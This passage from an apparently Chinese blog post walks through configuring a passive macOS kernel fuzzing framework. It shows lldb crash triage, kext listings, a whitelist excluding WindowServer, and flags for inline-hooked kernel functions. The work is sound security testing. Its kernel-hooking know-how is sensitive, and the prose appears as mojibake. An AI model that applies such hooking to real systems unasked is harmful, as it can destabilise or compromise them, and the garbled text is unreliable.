[opt]&#10;    frame #13: 0xffffff800dbb4de6 kernel.development`hndl_mach_scall64 + 22</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°frame #1 #2 #3çš„è°ƒç”¨æ ˆæ²¡æœ‰å…·ä½“çš„å‡½æ•°ç¬¦å·ï¼Œè·³è½¬åˆ°frame #6 é€šè¿‡å˜é‡è·å–ä¸€äº›ä¿¡æ¯ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) f 6&#10;frame #6: 0xffffff7f8f84dd03 pasive_kernel_fuzz`trampline_is_io_connect_method(connection=0xffffff8016acc200, selector=10, scalar_input=0xffffff8016659330, scalar_inputCnt=2, inband_input=&#34;&#34;, inband_inputCnt=0, ool_input=0, ool_input_size=0, inband_output=&#34;&#34;, inband_outputCnt=0xffffff8018e155fc, scalar_output=0xffffff886e39bd30, scalar_outputCnt=0xffffff886e39bd2c, ool_output=0, ool_output_size=0xffffff8016659364) + 1587 at is_io_connect_method_trampline.c:663&#10;   660 &#9;        g_fuzz_sample_info_index--;&#10;   661 &#9;    &#125;&#10;   662 &#9;    lck_mtx_unlock(g_fuzz_sample_info_mutext);&#10;-&#62; 663 &#9;    kr = ((fn_is_io_connect_method_t )inlined_part_is_io_connect_method)(&#10;   664 &#9;                                               //io_connect_t&#10;   665 &#9;                                               connection,&#10;   666 &#9;                                          //uint32_t&#10;   &#10;(lldb) p (char*)g_fuzz_sample_info[g_fuzz_sample_info_index].env.szClassName&#10;(char *) $3 = 0xffffff7f8faa9038 &#34;prl_video_ac_surface&#34;&#10;(lldb) p (char*)g_fuzz_sample_info[g_fuzz_sample_info_index].env.szProcName&#10;(char *) $4 = 0xffffff7f8faa9849 &#34;WindowServer&#34;&#10;(lldb) p (char*)g_fuzz_sample_info[g_fuzz_sample_info_index].env.szServiceClassName&#10;(char *) $5 = 0xffffff7f8faa9448 &#60;no value available&#62;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯çœ‹ä¸åˆ°<code>ServiceClassName</code>ï¼Œè°ƒç”¨å†…æ ¸è°ƒè¯•çš„è„šæœ¬showallkmodsã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) showallkmods&#10;UUID                                 kmod_info            address              size                  id  refs              version name&#10;B247A93A-1FEF-3A25-AECB-93F84593FDF6 0xffffff7f8f8fc660   0xffffff7f8f849000   0xfc1000             110     0                    1 put.as.pasive-kernel-fuzz&#10;5208EAB1-6B60-317E-83AF-FCE74FDD9B7F 0xffffff7f8e6a7a68   0xffffff7f8e64d000   0x5e000              109     0                3.0.1 com.apple.filesystems.smbfs&#10;2461725B-E5F1-3947-8AD8-8781308FA614 0xffffff7f8f20e508   0xffffff7f8f206000   0x9000               108     0                  3.0 com.apple.filesystems.autofs&#10;5A796890-4ED5-3BA9-8638-84EBBBDD2D53 0xffffff7f8e64b020   0xffffff7f8e648000   0x5000               107     2                  1.0 com.apple.kext.triggers&#10;47657EC5-2536-3174-97A7-6C19BA1067A4 0xffffff7f8f3854cc   0xffffff7f8f37e000   0x9000               106     0              1.0.2d2 com.apple.driver.AppleTyMCEDriver&#10;D9EF7435-0F3C-37BD-AA34-F1B7353C8D4F 0xffffff7f8f2ca528   0xffffff7f8f2c6000   0x5000               105     0                 1.70 com.apple.driver.AudioAUUC&#10;1AF6EE80-2420-C5D8-7F83-9E2446C1320C 0xffffff7f8f6db900   0xffffff7f8f6d7000   0x5000               104     0                1.1.0 com.parallels.driver.AppleIntelAC97Audio&#10;D0B2999C-6EB8-3E88-8CA5-60E05B6AD462 0xffffff7f8f5964a0   0xffffff7f8f593000   0x4000               103     0                    1 com.apple.driver.AppleOSXWatchdog&#10;B418B8D4-27F9-373C-8BEC-802554F3F794 0xffffff7f8e776d10   0xffffff7f8e76c000   0xb000               102     0                    1 com.apple.driver.pmtelemetry&#10;B2989894-92E1-3A9F-8F9A-924960162ABB 0xffffff7f8e8a1e20   0xffffff7f8e89c000   0x6000               101     0                1.0.1 com.apple.iokit.IOUserEthernet&#10;354FC780-7EA4-3C3F-A9E1-2658F63663A9 0xffffff7f8ed75b80   0xffffff7f8ed69000   0x13000              100     0              108.2.3 com.apple.iokit.IOSurface&#10;57A03351-E0D2-348B-A442-C4F5B6C4310E 0xffffff7f8ef41978   0xffffff7f8ef38000   0xa000                99     0              4.4.6f1 com.apple.iokit.IOBluetoothSerialManager&#10;854221E2-E1EB-361A-98C6-DC6B7E1EB0F4 0xffffff7f8ed964e0   0xffffff7f8ed8d000   0xe000                98     1                   11 com.apple.iokit.IOSerialFamily&#10;9B3C8089-B7BD-32F6-AC84-18501E3A5B1C 0xffffff7f8efdacb0   0xffffff7f8ef4c000   0xc3000               97     0              4.4.6f1 com.apple.iokit.IOBluetoothFamily&#10;3164D09B-101E-38E5-9399-BDE428C1E877 0xffffff7f8f0cb9a0   0xffffff7f8f0c8000   0x5000                96     0                7.0.0 com.apple.Dont_Steal_Mac_OS_X&#10;D04FEA18-A347-31F1-A04A-ED762DB9F0DE 0xffffff7f8f1f6668   0xffffff7f8f1f3000   0x7000                95     0                    1 com.apple.driver.CoreCaptureResponder&#10;0B572B9E-F1D5-31B0-AB6B-E19630F5126C 0xffffff7f8f1e1c68   0xffffff7f8f1c9000   0x22000               94     1                1.0.4 com.apple.driver.corecapture&#10;D8BF62A5-B66D-3495-9FBF-0B6D89CB2455 0xffffff7f8f6ef040   0xffffff7f8f6e6000   0xa000                93     0                    1 com.apple.driver.AppleHV&#10;A5A73220-5E26-3283-B29B-FEA298629620 0xffffff7f8f63f9d0   0xffffff7f8f63e000   0x2000                92     0                4.0.0 com.apple.driver.AppleIntelSlowAdaptiveClocking&#10;514292C4-55BD-3550-9DEB-1431BC04A629 0xffffff7f8ed84c78   0xffffff7f8ed82000   0x5000                91     1                1.0.0 com.apple.iokit.IOSlowAdaptiveClockingFamily&#10;864DACA4-8F2F-3442-B389-A42434D0F878 0xffffff7f8f77c9d8   0xffffff7f8f77a000   0x3000                90     0                4.1.0 com.apple.driver.AppleFIVRDriver&#10;EB8B7A35-4C31-A25F-87FC-AB5AAE190585 0xffffff7f8e7664c0   0xffffff7f8e762000   0x5000                89     0         12.1.0 41489 com.parallels.kext.tg&#10;6E57BC33-C4AF-3611-97B7-31CA2A2C88DD 0xffffff7f8f379520   0xffffff7f8f375000   0x5000                88     0                3.6.1 com.apple.driver.AppleUpstreamUserClient&#10;FE49EB19-A41C-3E7B-89CE-5411C85593D4 0xffffff7f8f5be6f8   0xffffff7f8f5b1000   0xe000                87     0               1.2.13 com.apple.driver.AppleMCCSControl&#10;546B348A-B5A7-3C41-9DDE-02A0A7B640B5 0xffffff7f8f5a96f0   0xffffff7f8f5a0000   0xe000                86     1             1.0.14d1 com.apple.driver.AppleSMBusController&#10;4EB2843C-C821-3AD0-B333-575FD6ED6FB1 0xffffff7f8eea1c58   0xffffff7f8ee98000   0x10000               85     0                2.4.1 com.apple.iokit.IONDRVSupport&#10;5820F1CC-8084-3447-AA45-ABB32D56EF25 0xffffff7f8ee42550   0xffffff7f8ee32000   0x11000               84     0                1.0.0 com.apple.driver.ACPI_SMC_PlatformPlugin&#10;7444F81D-08A8-36CE-A017-247C66701E4D 0xffffff7f8ee0e2c0   0xffffff7f8ee03000   0x12000               83     1                1.0.0 com.apple.driver.IOPlatformPluginLegacy&#10;4BEF649C-7CFD-31CA-8D84-1F0DB25BF60B 0xffffff7f8edfedf8   0xffffff7f8edf9000   0xa000                82     3              6.0.0d7 com.apple.driver.IOPlatformPluginFamily&#10;0C1376F2-15F7-30AD-BEEB-4CFC4AC4240A 0xffffff7f8f50b9a0   0xffffff7f8f50a000   0x3000                81     0             1.0.14d1 com.apple.driver.AppleSMBusPCI&#10;5F94D8E3-B1E5-35D7-AB7A-6419C3AAC3B5 0xffffff7f8f764f40   0xffffff7f8f750000   0x1e000               80     0               274.12 com.apple.driver.AppleHDAController&#10;C6423C28-4CFB-32A8-BDD1-2D149DE52F74 0xffffff7f8f748608   0xffffff7f8f741000   0xc000                79     1               274.12 com.apple.iokit.IOHDAFamily&#10;16D694E8-A341-3DAC-A710-57BC95EF7758 0xffffff7f8f2ab810   0xffffff7f8f28d000   0x31000               78     3                204.4 com.apple.iokit.IOAudioFamily&#10;C334E229-C366-3862-8A15-2399723870C6 0xffffff7f8f28b220   0xffffff7f8f211000   0x7c000               77     1                1.2.0 com.apple.vecLib.kext&#10;90BC49A2-E1CC-4A22-FD55-BEF0A13A15DA 0xffffff7f8f6ccfa0   0xffffff7f8f6c8000   0xf000                76     1                1.1.0 com.parallels.driver.AppleIntelAC97Controller&#10;C1523713-8957-31FE-AA11-62E1787969B1 0xffffff7f8ee2bb98   0xffffff7f8ee17000   0x19000               75     3                3.1.9 com.apple.driver.AppleSMC&#10;5256D8E2-78AD-245C-06FB-3C14D329A8BF 0xffffff7f8e750600   0xffffff7f8e745000   0x1a000               74     0         12.1.0 41489 com.parallels.kext.video&#10;A360453D-2050-3C49-A549-AC0DD5E87917 0xffffff7f8e728b78   0xffffff7f8e6fe000   0x3b000               73     6                2.4.1 com.apple.iokit.IOGraphicsFamily&#10;E4D6A0C3-5C8D-3652-B673-3FAFAA027E2E 0xffffff7f8f3e1ac8   0xffffff7f8f3dd000   0x9000                72     0                  181 com.apple.driver.AppleHIDKeyboard&#10;AC74012B-CBBC-323B-B760-0E31B664B7B5 0xffffff7f8eab1cb0   0xffffff7f8eaaa000   0xa000                71     0                1.0.1 com.apple.driver.usb.IOUSBHostHIDDevice&#10;69D22F66-81DA-3CCF-8451-A7EBC991A601 0xffffff7f8ebe7dd0   0xffffff7f8ebc1000   0x2f000               70     0                1.0.1 com.apple.driver.usb.AppleUSBHub&#10;204EA973-076B-3517-93BF-9057AD3DDBD6 0xffffff7f8f31d420   0xffffff7f8f31a000   0x9000                69     0                5.0.0 com.apple.driver.usb.cdc&#10;70876950-E9CC-313C-A239-5C1E5CA936BF 0xffffff7f8f3147e8   0xffffff7f8f312000   0x8000                68     1                5.0.0 com.apple.driver.usb.networking&#10;DC814FD4-7773-3054-8D2C-AFA8E6CA034A 0xffffff7f8ebfc008   0xffffff7f8ebf8000   0x8000                67     1                1.0.1 com.apple.driver.usb.AppleUSBHostCompositeDevice&#10;AB75EB2D-F0DF-34C8-8CDC-C3BD98F6CFAD 0xffffff7f8ede5980   0xffffff7f8edd4000   0x1a000               66     0                3.7.7 com.apple.iokit.IOSCSIMultimediaCommandsDevice&#10;F5455A4B-6444-375B-B41A-9DD21ED76068 0xffffff7f8edcd350   0xffffff7f8edc8000   0x9000                65     1                  1.8 com.apple.iokit.IOBDStorageFamily&#10;D13AB661-E2CF-3761-8D59-61A1AC99637E 0xffffff7f8edc03c0   0xffffff7f8edba000   0xb000                64     2                  1.8 com.apple.iokit.IODVDStorageFamily&#10;293F10B5-7BF9-3C0C-976E-9E588489C303 0xffffff7f8edb1c30   0xffffff7f8eda9000   0xe000                63     3                  1.8 com.apple.iokit.IOCDStorageFamily&#10;12F3B8F2-0104-362F-9B60-7751D73D4D80 0xffffff7f8eda4748   0xffffff7f8ed9e000   0x7000                62     0                3.7.7 com.apple.iokit.SCSITaskUserClient&#10;945A757B-968E-34CE-9067-525B6D0F8550 0xffffff7f8f1c4a58   0xffffff7f8f1af000   0x16000               61     0             517.50.1 com.apple.driver.CoreStorageFsck&#10;3B950A54-941B-380E-9C93-31E70591696E 0xffffff7f8f186e90   0xffffff7f8f0ce000   0xdb000               60     1             517.50.1 com.apple.driver.CoreStorage&#10;642EEDB3-7CE7-354A-9030-C644EC3D9083 0xffffff7f8f2d2f10   0xffffff7f8f2ce000   0xa000                59     0                    3 com.apple.driver.AppleXsanScheme&#10;C8E6B461-D83A-3660-8A8B-43EA262D4C11 0xffffff7f8f09a390   0xffffff7f8f092000   0xd000                58     0                2.6.2 com.apple.iokit.IOAHCISerialATAPI&#10;07D953DC-7B94-3AE8-A379-2B02F5D538F9 0xffffff7f8e303eb0   0xffffff7f8e2e9000   0x2b000               57     3                3.7.7 com.apple.iokit.IOSCSIArchitectureModelFamily&#10;03357B30-E9B5-32DC-819D-CACA2B37AE19 0xffffff7f8f0ba0d0   0xffffff7f8f09f000   0x1c000               56     0                2.8.5 com.apple.iokit.IOAHCIBlockStorage&#10;D2861F03-33FC-3B1D-9572-00E11EB6B530 0xffffff7f8f7809a8   0xffffff7f8f77f000   0x2000                55     0                3.0.1 com.apple.driver.AppleFileSystemDriver&#10;8A48FC7E-CD9D-39E4-A243-59BBEB5D65BE 0xffffff7f8f778a40   0xffffff7f8f776000   0x3000                54     0              1.0.0d1 com.apple.AppleFSCompression.AppleFSCompressionTypeDataless&#10;8A37264E-9D9A-3B95-B0A1-EB1947CF70DA 0xffffff7f8f773460   0xffffff7f8f76e000   0x6000                53     0                1.0.0 com.apple.AppleFSCompression.AppleFSCompressionTypeZlib&#10;C1EA21DC-CEC4-34EF-8172-8D217927D3EC 0xffffff7f8f202a18   0xffffff7f8f1fa000   0xa000                52     0                   38 com.apple.BootCache&#10;C94AA870-B315-3B68-8942-94FD5095B016 0xffffff7f8ec0a548   0xffffff7f8ec00000   0xb000                51     0                1.0.1 com.apple.driver.usb.AppleUSBEHCIPCI&#10;D08C7EEE-CA01-3053-8D47-2587BBCF9C95 0xffffff7f8eb1c438   0xffffff7f8eb03000   0x20000               50     0                1.0.1 com.apple.driver.usb.AppleUSBXHCIPCI&#10;931A3E67-1954-320C-9619-C41C0A516804 0xffffff7f8eaf15e0   0xffffff7f8eabd000   0x40000               49     1                1.0.1 com.apple.driver.usb.AppleUSBXHCI&#10;5BF1DFC0-0647-3A29-8555-8C0341DFB8A3 0xffffff7f8eb93cb8   0xffffff7f8eb90000   0x4000                48     0                1.0.1 com.apple.driver.usb.AppleUSBUHCIPCI&#10;2F1227C1-A3A9-3709-B7A9-93506A65AB00 0xffffff7f8eb83e38   0xffffff7f8eb6e000   0x1f000               47     1                1.0.1 com.apple.driver.usb.AppleUSBUHCI&#10;0D241802-E006-3A72-B3C5-09ABDE37DAE0 0xffffff7f8eb5dfd8   0xffffff7f8eb2b000   0x3f000               46     3                1.0.1 com.apple.driver.usb.AppleUSBEHCI&#10;B9AFCAD5-5FFE-3E65-A186-CF4EA4571BCC 0xffffff7f8f7b8c98   0xffffff7f8f79a000   0x1f000               45     0                3.1.8 com.apple.driver.AppleAHCIPort&#10;58B77CC0-5211-342E-8935-8D05E0B96867 0xffffff7f8f087520   0xffffff7f8f074000   0x1b000               44     3                2.8.1 com.apple.iokit.IOAHCIFamily&#10;A6DFC31E-C32B-3FD9-8FC9-27791F49BBB5 0xffffff7f8f06b668   0xffffff7f8f062000   0xa000                43     0                2.5.1 com.apple.driver.AppleIntelPIIXATA&#10;148B6371-28AE-30E6-B469-00A9587C7EFF 0xffffff7f8f030668   0xffffff7f8f022000   0x19000               42     1                2.5.3 com.apple.iokit.IOATAFamily&#10;F74DD10C-690C-3B74-98F5-F50E093A1E68 0xffffff7f8ee90ce0   0xffffff7f8ee80000   0x11000               41     0              3.1.4b1 com.apple.driver.AppleIntel8254XEthernet&#10;848B398F-4D96-3024-8092-6CD3534D2CCA 0xffffff7f8e883f50   0xffffff7f8e868000   0x2d000               40     2                  3.2 com.apple.iokit.IONetworkingFamily&#10;FB980EB5-1F73-348E-9554-6F9F6FE481FD 0xffffff7f8e9c95d0   0xffffff7f8e953000   0x9a000               39     0              900.4.1 com.apple.iokit.IOUSBFamily&#10;79D250A3-843A-3750-BE64-A252CF17A148 0xffffff7f8e8fadb4   0xffffff7f8e8ac000   0x6a000               38    12                1.0.1 com.apple.iokit.IOUSBHostFamily&#10;401B7165-36E8-3EE5-849D-71DAEB3E46E4 0xffffff7f8e8a99a8   0xffffff7f8e8a8000   0x4000                37     2                1.0.1 com.apple.driver.AppleUSBHostMergeProperties&#10;0A3B2F6D-7FC8-34C1-B4B2-B4A53DC85DE5 0xffffff7f8f519ed0   0xffffff7f8f513000   0x8000                36     0              161.0.0 com.apple.driver.AppleSmartBatteryManager&#10;DFA558FE-59F9-32AA-8C3A-82BD65ECC094 0xffffff7f8ee550e0   0xffffff7f8ee4f000   0xa000                35     0                  2.0 com.apple.driver.AppleEFINVRAM&#10;CFC72657-568A-33B3-B84A-CF659674E655 0xffffff7f8ee4ca10   0xffffff7f8ee4a000   0x5000                34     1                  2.0 com.apple.driver.AppleEFIRuntime&#10;456C28F7-4F2B-3F00-97C9-BF6023DADD7C 0xffffff7f8f83bcb0   0xffffff7f8f838000   0x4000                33     0                  4.0 com.apple.driver.AppleACPIButtons&#10;9A3F90D7-1A6A-3FCD-9689-0BF6A66A29A2 0xffffff7f8ea75c58   0xffffff7f8ea1e000   0x78000               32     3                2.0.0 com.apple.iokit.IOHIDFamily&#10;801E20D9-1D7A-353F-A638-05430128D61D 0xffffff7f8f72c9c8   0xffffff7f8f72a000   0x3000                31     0                  1.8 com.apple.driver.AppleHPET&#10;87E6B264-9FE7-354F-A83B-2AF966681A50 0xffffff7f8f834540   0xffffff7f8f82e000   0x7000                30     0                  4.0 com.apple.driver.AppleACPIEC&#10;EA577FC5-B1EE-38B4-9B62-2938C01C2CB2 0xffffff7f8ed7fc58   0xffffff7f8ed7e000   0x4000                29     3                  1.1 com.apple.iokit.IOSMBusFamily&#10;6409E881-1F83-380E-8F03-F21DCFC4BF53 0xffffff7f8f5424f0   0xffffff7f8f53b000   0x8000                28     0                  2.0 com.apple.driver.AppleRTC&#10;BEB6C00A-8353-3DE6-A438-3D8AE2F9A5F0 0xffffff7f8f510ab8   0xffffff7f8f50d000   0x4000                27     0                  2.1 com.apple.driver.AppleSMBIOS&#10;04696395-E633-3657-89BD-9908A5C60F56 0xffffff7f8f797a28   0xffffff7f8f795000   0x3000                26     0                  1.7 com.apple.driver.AppleAPIC&#10;113F310F-1904-3F41-A206-1D275BF7A397 0xffffff7f8f846280   0xffffff7f8f83f000   0x8000                25     0                  163 com.apple.nke.applicationfirewall&#10;0ECF10A0-C16A-3013-B6B6-CD9F3DA76B01 0xffffff7f8e6efc00   0xffffff7f8e6e7000   0x9000                24     0                    3 com.apple.security.quarantine&#10;E32DE435-FAD0-3222-807A-32711BCB979B 0xffffff7f8e6e15c8   0xffffff7f8e6c9000   0x1e000               23     1                300.0 com.apple.security.sandbox&#10;F2211BA2-E656-3187-B06E-CF9D6A3A3B5A 0xffffff7f8e6c7008   0xffffff7f8e6c4000   0x5000                22     2              1.0.0d1 com.apple.kext.AppleMatch&#10;7F6B05B1-14AC-3634-B5CA-7F69452730B4 0xffffff7f8e5b1b08   0xffffff7f8e5b0000   0x2000                21     0                    8 com.apple.security.TMSafetyNet&#10;8CF8BDE4-6E36-3163-9EA1-DB09980ED7B2 0xffffff7f8f62e60c   0xffffff7f8f60c000   0x2b000               20     0                    2 com.apple.driver.AppleKeyStore&#10;D330951F-27FC-3A94-94A6-2AD7850E9C3C 0xffffff7f8e6ba808   0xffffff7f8e6b2000   0x12000               19     2                1.0.5 com.apple.driver.AppleMobileFileIntegrity&#10;22552717-92AB-3B19-98B5-5C067A104219 0xffffff7f8f606580   0xffffff7f8f5ee000   0x1e000               18     1                  1.0 com.apple.driver.AppleCredentialManager&#10;CDCF4D3F-89CC-3CDD-AB89-B6FFD304F26B 0xffffff7f8eeb9930   0xffffff7f8eea8000   0x19000               17     0                417.4 com.apple.driver.DiskImages&#10;DC1AAB7C-F417-3238-BB3F-2A5B84D67B90 0xffffff7f8e265550   0xffffff7f8e24c000   0x27000               16    12                  2.1 com.apple.iokit.IOStorageFamily&#10;C89107EE-2DF2-3BC3-9F6D-3133D43ED7EF 0xffffff7f8edf54d8   0xffffff7f8edf2000   0x7000                15     2                   31 com.apple.iokit.IOReportFamily&#10;C31A19C9-8174-3E35-B2CD-3B1B237C0220 0xffffff7f8ea1a4e0   0xffffff7f8ea13000   0xb000                14     1                28.30 com.apple.driver.AppleFDEKeyStore&#10;A29C7512-D3A8-3AED-9721-3A5FF1A32EB2 0xffffff7f8f8149f8   0xffffff7f8f7c8000   0x60000               13     2                  4.0 com.apple.driver.AppleACPIPlatform&#10;F51AA3D6-EC2F-3AD3-A043-06DB79027AA2 0xffffff7f8e351c48   0xffffff7f8e32c000   0x30000               12    22                  2.9 com.apple.iokit.IOPCIFamily&#10;5D7574C3-8E90-3873-BAEB-D979FC215A7D 0xffffff7f8eab7a00   0xffffff7f8eab4000   0x9000                11    21                  1.4 com.apple.iokit.IOACPIFamily&#10;9DDD9196-3824-3DCA-BAAA-7F383BC13C37 0xffffff7f8e784000   0xffffff7f8e77d000   0x9000                10     1                    1 com.apple.kec.Libm&#10;39D0B4EB-B7F4-3891-96C2-F8B886656C8A 0xffffff7f8e6fb6b8   0xffffff7f8e6f1000   0xd000                 9     0                    1 com.apple.kec.pthread&#10;ABDB0534-113E-3A88-8B89-52345E3AFDF7 0xffffff7f8e612ea0   0xffffff7f8e5b3000   0x95000                8     5                  1.0 com.apple.kec.corecrypto&#10;........-....-....-....-............ 0xffffff80142c1e00   0x0                  0x0                    7    60               15.6.0 com.apple.kpi.unsupported&#10;........-....-....-....-............ 0xffffff80142c1d00   0x0                  0x0                    6    45               15.6.0 com.apple.kpi.private&#10;........-....-....-....-............ 0xffffff80142c1100   0x0                  0x0                    5    88               15.6.0 com.apple.kpi.mach&#10;........-....-....-....-............ 0xffffff80142c1200   0x0                  0x0                    4   103               15.6.0 com.apple.kpi.libkern&#10;........-....-....-....-............ 0xffffff80142c1300   0x0                  0x0                    3    97               15.6.0 com.apple.kpi.iokit&#10;........-....-....-....-............ 0xffffff80142c1c00   0x0                  0x0                    2     8               15.6.0 com.apple.kpi.dsep&#10;........-....-....-....-............ 0xffffff80142c1b00   0x0                  0x0                    1    76               15.6.0 com.apple.kpi.bsd</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®å†…æ ¸åœ°å€çš„æ¯”è¾ƒ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5256D8E2-78AD-245C-06FB-3C14D329A8BF 0xffffff7f8e750600   0xffffff7f8e745000   0x1a000               74     0         12.1.0 41489 com.parallels.kext.video&#10;----&#10; frame #0: 0xffffff800d90e05b kernel.development`memcpy + 11&#10; frame #1: 0xffffff7f8e7485e8&#10; frame #2: 0xffffff7f8e746630</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°å´©æºƒåœ¨<code>com.parallels.kext.video</code>è¿™ä¸ªè™šæ‹Ÿæœºçš„å†…æ ¸æ‰©å±•ä¸­ï¼Œæ‰€ä»¥å®‰è£…äº†<code>KDK</code>ä¹Ÿæ²¡æœ‰å‡½æ•°ç¬¦å·ã€‚è¿™ä¸ªæ¨¡å—ä¸æ˜¯æˆ‘ä»¬æ„Ÿå…´è¶£çš„ï¼Œæ‰€ä»¥æ·»åŠ ä¸€ä¸ªç™½åå•ï¼Œå‰”é™¤æ‰å¯¹è¿™ä¸ªè°ƒç”¨çš„fuzzã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"*"</span>,PROCESS_UID_ANY_INTEGER,<span class="string">"*"</span>,<span class="string">"IGAccelSharedUserClient"</span>,<span class="number">0</span>,<span class="comment">//tocheck-43</span></span><br><span class="line"><span class="comment">//By experience:</span></span><br><span class="line"><span class="comment">//"profil",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"notify",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"watchdog",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"vmware",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"*","PROCESS_UID_ANY_INTEGER,*","vmware",ANY_MATCH_INTEGER,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//"*",PROCESS_UID_ANY_INTEGER,"*","AppleOSXWatchdogClient",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"*",PROCESS_UID_ANY_INTEGER,"*","AppleSMCClient",ANY_MATCH_INTEGER,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Testing:</span></span><br><span class="line"><span class="comment">//"SystemUIServer",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="string">"WindowServer"</span>,PROCESS_UID_ANY_INTEGER,<span class="string">"*"</span>,<span class="string">"*"</span>,ANY_MATCH_INTEGER, &lt;--windowserver æ‰€æœ‰çš„ç›¸å…³çš„è°ƒç”¨éƒ½ä¸è¿›è¡Œfuzz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//"dock",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ä¸€æ¥ï¼Œå¯¼è‡´æˆ‘ä»¬å´©æºƒçš„è¿™ä¸€æ¡å°±ä¸ä¼šè¿›è¡Œ<code>fuzz</code>ä»è€Œå‰”é™¤äº†è¿™ä¸ªå¹²æ‰°ã€‚ç¼–è¯‘ä¹‹åå†æ¬¡åŠ è½½</p>
<h1 id="3-4_å†æ¬¡åŠ è½½å†…æ ¸æ‰©å±•">3.4 å†æ¬¡åŠ è½½å†…æ ¸æ‰©å±•</h1><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/pasive_fuzz/fuzzing.png" alt="fuzzing"></p>
<p>æˆ‘æŠŠä»–ä»¬æ³¨é‡Šæ‰çš„è°ƒè¯•ä¿¡æ¯éƒ½æ”¾å¼€äº†ï¼Œå¦‚æœä¸æŠŠæ³¨é‡Šåˆ äº†ä¹Ÿçœ‹ä¸åˆ°è¿™äº›æ—¥å¿—ã€‚</p>
<h1 id="0x04_å°ç»“">0x04 å°ç»“</h1><p>åˆæ­¥çš„ä½¿ç”¨è¿™ä¸ª<code>fuzzing</code>æ¡†æ¶çš„è¿‡ç¨‹å°±æ˜¯è¿™æ ·ï¼Œè¿™ä¸ªæ¡†æ¶è¿˜ä¼šå¯¹å…¶ä»–å‡ ä¸ªæ ¸å¿ƒå‡½æ•°è¿›è¡Œæµ‹è¯•ï¼Œåœ¨<code>ppt</code>ä¸­ä¹Ÿæœ‰æ‰€æè¿°ã€‚åŒæ—¶è¿™é‡Œä¹Ÿæœ‰ç›¸å¯¹åº”çš„æµ‹è¯•å¼€å…³ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bFuzzing flags</span></span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_CREATE_MAPPING_IN_TASK].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IPC_KMSG_GET].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_COPY_IO].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IS_IO_CONNECT_METHOD].bFuzzing = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IPC_KMSG_SEND].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_MACH_MSG_OVERWRITE_TRAP].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IS_IO_CONNECT_ASYNC_METHOD].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_KDP_PANIC_DUMP].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IOKIT_USER_CLIENT_TRAP].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IS_IO_SERVICE_OPEN_EXTENDED].bFuzzing = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>æœ¬æ¬¡å®éªŒä¸­åªæ˜¯ä¿®æ”¹äº†ç™½åå•ï¼Œæ¡†æ¶ä¸­è¿˜æä¾›äº†é»‘åå•ï¼Œç®€å•é˜…è¯»æºç ä¹‹åä¹Ÿå¾ˆå®¹æ˜“ç†è§£å®ƒçš„åŠŸèƒ½ï¼Œç™½åå•å’Œé»‘åå•çš„å®ç°ï¼Œå¯ä»¥è®©fuzzæ›´åŠ çš„ç¨³å®šã€‚</p>
<h1 id="å¼•ç”¨">å¼•ç”¨</h1><p>[1]Revisiting Mac OS X Kernel Rootkits </p>
<p><a href="http://phrack.org/issues/69/7.html#article" target="_blank" rel="external">http://phrack.org/issues/69/7.html#article</a></p>
<p>[2]Resolving kernel symbols</p>
